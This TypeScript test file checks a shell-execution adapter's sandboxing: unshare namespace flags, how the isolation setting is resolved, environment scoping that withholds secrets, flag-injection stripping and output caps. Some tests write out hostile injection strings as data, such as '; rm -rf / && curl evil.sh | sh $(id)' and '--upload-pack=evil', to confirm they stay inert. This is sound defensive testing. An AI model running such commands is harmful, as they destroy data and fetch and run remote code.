import { describe, test, expect, afterEach } from "bun:test";
import { homedir, tmpdir } from "node:os";
import { statSync } from "node:fs";
import type { Exchange } from "@routecraft/routecraft";
import { shell, untrusted } from "@routecraft/os";
import { noneTier } from "../src/adapters/shell/isolation/none.ts";
import { unshareTier } from "../src/adapters/shell/isolation/unshare.ts";
import { resolveIsolation } from "../src/adapters/shell/isolation/index.ts";
import {
  BoundedOutput,
  buildEnv,
  exitCodeForSignal,
  sanitiseArgs,
} from "../src/adapters/shell/shared.ts";

/** No context is registered, so plugin defaults are absent by design. */
const exchange = {} as Exchange<unknown>;

const target = { file: "git", args: ["log", "--oneline"] };

afterEach(() => {
  delete process.env["ROUTECRAFT_SHELL_ISOLATION"];
});

describe("isolation tier invocation", () => {
  /**
   * @case The none tier runs the command unchanged
   * @preconditions A target invocation and a request granting nothing
   * @expectedResult The invocation is returned as given, with no wrapper
   */
  test("the none tier does not wrap the invocation", () => {
    expect(
      noneTier.wrap(target, { network: false, mapRootUser: false }),
    ).toEqual(target);
  });

  /**
   * @case The unshare tier requests every namespace it promises
   * @preconditions A request denying network and mapping the current user
   * @expectedResult unshare is invoked with the user, mount, pid, net, ipc, uts and cgroup flags
   */
  test("the unshare tier asks for the namespaces it promises", () => {
    const wrapped = unshareTier.wrap(target, {
      network: false,
      mapRootUser: false,
    });
    expect(wrapped.file).toBe("unshare");
    expect(wrapped.args).toContain("--user");
    expect(wrapped.args).toContain("--map-current-user");
    expect(wrapped.args).toContain("--mount");
    expect(wrapped.args).toContain("--pid");
    expect(wrapped.args).toContain("--fork");
    expect(wrapped.args).toContain("--mount-proc");
    expect(wrapped.args).toContain("--net");
    expect(wrapped.args).toContain("--ipc");
    expect(wrapped.args).toContain("--uts");
    expect(wrapped.args).toContain("--cgroup");
  });

  /**
   * @case Granting the network drops only the network namespace
   * @preconditions A request with network true
   * @expectedResult The --net flag is absent while every other namespace remains
   */
  test("granting the network removes only --net", () => {
    const wrapped = unshareTier.wrap(target, {
      network: true,
      mapRootUser: false,
    });
    expect(wrapped.args).not.toContain("--net");
    expect(wrapped.args).toContain("--user");
    expect(wrapped.args).toContain("--pid");
  });

  /**
   * @case Identity mapping follows the request rather than a fixed choice
   * @preconditions Requests with mapRootUser false and true
   * @expectedResult The current-user mapping is the default and root mapping is opt-in
   */
  test("identity is mapped to the caller unless root is asked for", () => {
    const asCaller = unshareTier.wrap(target, {
      network: false,
      mapRootUser: false,
    });
    expect(asCaller.args).toContain("--map-current-user");
    expect(asCaller.args).not.toContain("--map-root-user");

    const asRoot = unshareTier.wrap(target, {
      network: false,
      mapRootUser: true,
    });
    expect(asRoot.args).toContain("--map-root-user");
    expect(asRoot.args).not.toContain("--map-current-user");
  });

  /**
   * @case The target's own flags are protected from the wrapper
   * @preconditions A target whose arguments begin with a double-dash flag
   * @expectedResult A bare -- separates unshare's flags from the target's
   */
  test("the target's flags are separated from unshare's own", () => {
    const wrapped = unshareTier.wrap(target, {
      network: false,
      mapRootUser: false,
    });
    const separator = wrapped.args.indexOf("--");
    expect(separator).toBeGreaterThan(0);
    expect(wrapped.args.slice(separator + 1)).toEqual([
      "git",
      "log",
      "--oneline",
    ]);
  });
});

describe("a tier refuses what it cannot satisfy", () => {
  /**
   * @case The none tier refuses a call that left egress denied
   * @preconditions isolation none with network defaulted, which documents egress as denied
   * @expectedResult Throws OS1004 naming network: true, rather than running with full egress under a default that says denied
   */
  test("the none tier refuses denied egress it cannot deliver", async () => {
    await expect(
      shell("true", [], { isolation: "none" }).fetch(exchange),
    ).rejects.toThrow(/cannot deny network egress/);
  });

  /**
   * @case An explicit network false is refused as plainly as the default
   * @preconditions isolation none with network false written out
   * @expectedResult Throws, because the silently voided option is the one an author was most sure of
   */
  test("an explicit network false is refused too", async () => {
    await expect(
      shell("true", [], { isolation: "none", network: false }).fetch(exchange),
    ).rejects.toThrow(/cannot deny network egress/);
  });

  /**
   * @case Accepting egress out loud is what makes the none tier usable
   * @preconditions isolation none with network true
   * @expectedResult The command runs, so the cost of the refusal is one visible word
   */
  test("accepting egress out loud is accepted", async () => {
    const result = await shell("true", [], {
      isolation: "none",
      network: true,
    }).fetch(exchange);
    expect(result.exitCode).toBe(0);
  });

  /**
   * @case The none tier refuses an identity it cannot map
   * @preconditions isolation none with mapRootUser true, egress accepted so only the identity is at issue
   * @expectedResult Throws naming the mapping, rather than running as the caller while the call asked for root
   */
  test("the none tier refuses an identity mapping it cannot make", async () => {
    await expect(
      shell("true", [], {
        isolation: "none",
        network: true,
        mapRootUser: true,
      }).fetch(exchange),
    ).rejects.toThrow(/cannot map identity/);
  });

  /**
   * @case The unshare tier refuses nothing this adapter can express
   * @preconditions Every combination of the two options
   * @expectedResult No refusal, because each option maps onto a namespace the tier takes
   */
  test("the unshare tier refuses nothing it is asked", () => {
    for (const network of [true, false]) {
      for (const mapRootUser of [true, false]) {
        expect(unshareTier.refuse({ network, mapRootUser })).toBeUndefined();
      }
    }
  });
});

describe("isolation resolution", () => {
  /**
   * @case Nothing chosen anywhere yields the isolated default
   * @preconditions No per-call value, no env override, no plugin default
   * @expectedResult The unshare tier, never the none tier
   */
  test("the default is isolated", () => {
    expect(resolveIsolation(undefined, undefined).name).toBe("unshare");
  });

  /**
   * @case The call site outranks the operator override
   * @preconditions The env names none while the call demands unshare
   * @expectedResult The call site wins, so an explicit demand is never weakened
   */
  test("a per-call tier beats the environment override", () => {
    process.env["ROUTECRAFT_SHELL_ISOLATION"] = "none";
    expect(resolveIsolation("unshare", undefined).name).toBe("unshare");
  });

  /**
   * @case The operator override outranks plugin defaults
   * @preconditions The env names unshare while the plugin default is none
   * @expectedResult The environment wins, so a deployment can be hardened
   */
  test("the environment override beats plugin defaults", () => {
    process.env["ROUTECRAFT_SHELL_ISOLATION"] = "unshare";
    expect(resolveIsolation(undefined, "none").name).toBe("unshare");
  });

  /**
   * @case Plugin defaults apply when nothing else chooses
   * @preconditions Only a plugin default is set
   * @expectedResult The plugin's tier is used
   */
  test("plugin defaults apply when nothing else chooses", () => {
    expect(resolveIsolation(undefined, "none").name).toBe("none");
  });

  /**
   * @case An inherited object key is not mistaken for a tier
   * @preconditions The env names a property every object inherits
   * @expectedResult Refused by name, rather than resolving to a non-tier that fails later
   */
  test("a prototype key is not a tier", () => {
    process.env["ROUTECRAFT_SHELL_ISOLATION"] = "constructor";
    expect(() => resolveIsolation(undefined, undefined)).toThrow(/constructor/);
  });

  /**
   * @case An unrecognised override is refused rather than ignored
   * @preconditions The env names a tier this build does not provide
   * @expectedResult Throws, so a typo cannot silently leave the default in place
   */
  test("an unknown environment override throws", () => {
    process.env["ROUTECRAFT_SHELL_ISOLATION"] = "dcoker";
    expect(() => resolveIsolation(undefined, undefined)).toThrow(/dcoker/);
  });
});

describe("environment scoping", () => {
  /**
   * @case Only the documented baseline is granted by default
   * @preconditions A parent variable that is not part of the baseline
   * @expectedResult The variable is absent from the command's environment
   */
  test("a parent variable is not forwarded by default", () => {
    process.env["SHELL_TEST_SECRET"] = "leak";
    try {
      const env = buildEnv(undefined, undefined);
      expect(env["SHELL_TEST_SECRET"]).toBeUndefined();
      expect(
        Object.keys(env).every((k) =>
          ["PATH", "HOME", "LANG", "TZ"].includes(k),
        ),
      ).toBe(true);
    } finally {
      delete process.env["SHELL_TEST_SECRET"];
    }
  });

  /**
   * @case The baseline grants names with fixed values, not the caller's
   * @preconditions No passEnv and no env, so only the baseline applies
   * @expectedResult HOME is not the caller's home and PATH is not the caller's PATH, so a command cannot find ~/.aws or ~/.ssh and cannot be chosen by a writable PATH entry
   */
  test("the baseline does not inherit the caller's values", () => {
    const env = buildEnv(undefined, undefined);
    expect(env["HOME"]).not.toBe(homedir());
    expect(env["PATH"]).not.toBe(process.env["PATH"]);
    expect(env["LANG"]).toBe("C.UTF-8");
    expect(env["TZ"]).toBe("UTC");
  });

  /**
   * @case The granted HOME is private to this process, not a shared directory
   * @preconditions The baseline HOME, inspected on disk
   * @expectedResult It is not the system temp directory itself and is not group or world writable, so another local account cannot plant a .gitconfig or .npmrc that every command would read
   */
  test("the granted HOME cannot be written by anyone else", () => {
    const home = buildEnv(undefined, undefined)["HOME"]!;
    expect(home).not.toBe(tmpdir());
    expect(home.startsWith(tmpdir())).toBe(true);
    const mode = statSync(home).mode & 0o777;
    expect(mode & 0o077).toBe(0);
  });

  /**
   * @case The caller's own home is available when the call asks for it
   * @preconditions passEnv naming HOME
   * @expectedResult The caller's home overrides the baseline, so the fixed value is a default and not a wall
   */
  test("forwarding HOME by name returns the caller's own", () => {
    expect(buildEnv(["HOME"], undefined)["HOME"]).toBe(homedir());
  });

  /**
   * @case A named variable is forwarded when the call declares it
   * @preconditions The call lists the variable in passEnv
   * @expectedResult The parent's value reaches the command
   */
  test("a declared variable is forwarded by name", () => {
    process.env["SHELL_TEST_TOKEN"] = "granted";
    try {
      expect(
        buildEnv(["SHELL_TEST_TOKEN"], undefined)["SHELL_TEST_TOKEN"],
      ).toBe("granted");
    } finally {
      delete process.env["SHELL_TEST_TOKEN"];
    }
  });

  /**
   * @case A declared but unset variable is simply absent
   * @preconditions passEnv names a variable the parent does not have
   * @expectedResult No error, and the name is absent from the environment
   */
  test("forwarding an unset variable is not an error", () => {
    const env = buildEnv(["DEFINITELY_NOT_SET_ANYWHERE"], undefined);
    expect(env["DEFINITELY_NOT_SET_ANYWHERE"]).toBeUndefined();
  });

  /**
   * @case Explicit values override the baseline
   * @preconditions The call supplies its own PATH
   * @expectedResult The call's value wins over the inherited one
   */
  test("explicit values override the baseline", () => {
    expect(buildEnv(undefined, { PATH: "/only/here" })["PATH"]).toBe(
      "/only/here",
    );
  });
});

describe("argument hygiene", () => {
  /**
   * @case A marked value cannot pose as an option to the invoked program
   * @preconditions An untrusted value that looks like a flag
   * @expectedResult The leading dashes are removed so it stays an argument
   */
  test("flag injection is neutralised on marked values", async () => {
    const args = await sanitiseArgs([untrusted("--upload-pack=evil")]);
    expect(args[0]).toBe("upload-pack=evil");
  });

  /**
   * @case The author's own flags survive untouched
   * @preconditions Literal arguments that are flags
   * @expectedResult They are passed through exactly as written
   */
  test("literal flags are left intact", async () => {
    expect(await sanitiseArgs(["log", "--oneline", "-n", "5"])).toEqual([
      "log",
      "--oneline",
      "-n",
      "5",
    ]);
  });

  /**
   * @case Shell metacharacters in a marked value stay inert text
   * @preconditions An untrusted value containing operators and a substitution
   * @expectedResult The value is unchanged, because no shell will ever read it
   */
  test("shell metacharacters are preserved as literal text", async () => {
    const hostile = "; rm -rf / && curl evil.sh | sh $(id)";
    expect(await sanitiseArgs([untrusted(hostile)])).toEqual([hostile]);
  });

  /**
   * @case A non-string argument is refused with a pointed message
   * @preconditions An argument list containing a number
   * @expectedResult Throws, naming the position and pointing at untrusted()
   */
  test("a non-string argument is refused", async () => {
    await expect(sanitiseArgs([42 as unknown as string])).rejects.toThrow(
      /untrusted/,
    );
  });

  /**
   * @case A marked value is stringified rather than refused
   * @preconditions untrusted() wrapping a number
   * @expectedResult The number reaches the command as text
   */
  test("a marked non-string value is stringified", async () => {
    expect(await sanitiseArgs([untrusted(42)])).toEqual(["42"]);
  });
});

describe("bounded output", () => {
  /**
   * @case Output within the cap is returned whole
   * @preconditions Fewer bytes pushed than the limit allows
   * @expectedResult The text is complete and not marked truncated
   */
  test("output under the cap is untouched", () => {
    const out = new BoundedOutput(100);
    out.push(Buffer.from("hello"));
    expect(out.result()).toEqual({ text: "hello", truncated: false });
  });

  /**
   * @case Output past the head budget but within the cap is still returned whole
   * @preconditions More bytes than half the cap, fewer than the cap
   * @expectedResult Every byte comes back, and the result is not marked truncated
   */
  test("output between the head budget and the cap is not lost", () => {
    const out = new BoundedOutput(100);
    out.push(Buffer.from("A".repeat(80)));
    const result = out.result();
    expect(result.text.length).toBe(80);
    expect(result.truncated).toBe(false);
  });

  /**
   * @case A non-positive cap is refused when the collector is built
   * @preconditions A negative or zero maxOutputBytes
   * @expectedResult Throws at construction, never from inside a stream handler where it would hang the route
   */
  test("a non-positive cap is refused at construction", () => {
    expect(() => new BoundedOutput(-4)).toThrow(/positive number of bytes/);
    expect(() => new BoundedOutput(0)).toThrow(/positive number of bytes/);
    expect(() => new BoundedOutput(Number.NaN)).toThrow();
  });

  /**
   * @case Overflow keeps the head and the tail rather than either alone
   * @preconditions More bytes pushed than the limit allows
   * @expectedResult Both ends survive, separated by a marker, and truncated is set
   */
  test("overflow keeps both ends with a marker between", () => {
    const out = new BoundedOutput(20);
    out.push(Buffer.from("START"));
    out.push(Buffer.from("x".repeat(200)));
    out.push(Buffer.from("END"));
    const { text, truncated } = out.result();
    expect(truncated).toBe(true);
    expect(text.startsWith("START")).toBe(true);
    expect(text.endsWith("END")).toBe(true);
    expect(text).toContain("truncated");
  });

  /**
   * @case A decoded chunk is accepted as readily as a binary one
   * @preconditions A string pushed rather than a Uint8Array
   * @expectedResult It is captured, because a throw here would hang the command
   */
  test("a string chunk is coerced rather than refused", () => {
    const out = new BoundedOutput(100);
    out.push("decoded");
    expect(out.result().text).toBe("decoded");
  });
});

describe("signal exit codes", () => {
  /**
   * @case A signalled command reports the conventional exit status
   * @preconditions A command killed by SIGTERM, and one killed by nothing
   * @expectedResult 128 plus the signal number, and a plain failure otherwise
   */
  test("a killed command reports 128 plus the signal", () => {
    expect(exitCodeForSignal("SIGTERM")).toBe(143);
    expect(exitCodeForSignal("SIGKILL")).toBe(137);
    expect(exitCodeForSignal(undefined)).toBe(1);
  });
});

describe("running a command", () => {
  /**
   * @case A successful command produces its output and a zero exit code
   * @preconditions The none tier, so the test runs on any host
   * @expectedResult stdout carries the text and exitCode is 0
   */
  test("a command's output is captured", async () => {
    const result = await shell("echo", ["hello"], {
      isolation: "none",
      network: true,
    }).fetch(exchange);
    expect(result.stdout.trim()).toBe("hello");
    expect(result.exitCode).toBe(0);
    expect(result.truncated).toBe(false);
  });

  /**
   * @case A failing command halts the route by default
   * @preconditions A command that exits non-zero, with no opt-out
   * @expectedResult Throws, naming the exit code and the opt-out
   */
  test("a non-zero exit throws by default", async () => {
    await expect(
      shell("false", [], { isolation: "none", network: true }).fetch(exchange),
    ).rejects.toThrow(/exited with code 1/);
  });

  /**
   * @case OS1002 carries the fields its own suggestion tells a route to read
   * @preconditions A command that writes to stderr and exits non-zero
   * @expectedResult The thrown error's cause carries stderr and exitCode, not just the message text
   */
  test("a non-zero exit puts stderr and exitCode on the cause", async () => {
    let thrown: unknown;
    try {
      await shell("sh", ["-c", "echo boom >&2; exit 3"], {
        isolation: "none",
        network: true,
      }).fetch(exchange);
    } catch (e: unknown) {
      thrown = e;
    }
    const error = thrown as { cause?: { stderr?: string; exitCode?: number } };
    expect(error.cause?.stderr?.trim()).toBe("boom");
    expect(error.cause?.exitCode).toBe(3);
  });

  /**
   * @case A failure under a tier that denied egress says so
   * @preconditions A command failing with a non-zero exit under the none tier, where nothing was denied
   * @expectedResult No egress note, because naming a denial that did not happen sends the reader after a cause that is not there
   */
  test("no egress note when the tier denied nothing", async () => {
    await expect(
      shell("false", [], { isolation: "none", network: true }).fetch(exchange),
    ).rejects.toThrow(/^(?!.*without network access).*$/s);
  });

  /**
   * @case A command whose exit code is data reports it instead of failing
   * @preconditions The same failing command with failOnNonZero false
   * @expectedResult The exit code is returned on the result
   */
  test("a non-zero exit is data when the call says so", async () => {
    const result = await shell("false", [], {
      isolation: "none",
      network: true,
      failOnNonZero: false,
    }).fetch(exchange);
    expect(result.exitCode).toBe(1);
  });

  /**
   * @case A hostile argument reaches the program as one argument
   * @preconditions An untrusted value containing shell operators
   * @expectedResult The program echoes it verbatim, having never met a shell
   */
  test("an injected command stays an argument", async () => {
    const result = await shell(
      "echo",
      [untrusted("; rm -rf / && curl evil.sh")],
      { isolation: "none", network: true },
    ).fetch(exchange);
    expect(result.stdout.trim()).toBe("; rm -rf / && curl evil.sh");
  });

  /**
   * @case A command that cannot be started says so distinctly
   * @preconditions A command line passed where a program name belongs
   * @expectedResult Throws with advice to pass the arguments separately
   */
  test("a command line mistaken for a program name is explained", async () => {
    await expect(
      shell("definitely not a program", [], {
        isolation: "none",
        network: true,
      }).fetch(exchange),
    ).rejects.toThrow(/pass the arguments separately/);
  });

  /**
   * @case Construction refuses a command that names nothing
   * @preconditions An empty command string
   * @expectedResult Throws when the adapter is built, not when it runs
   */
  test("an empty command is refused at construction", () => {
    expect(() => shell("", [])).toThrow(/non-empty string/);
  });
});
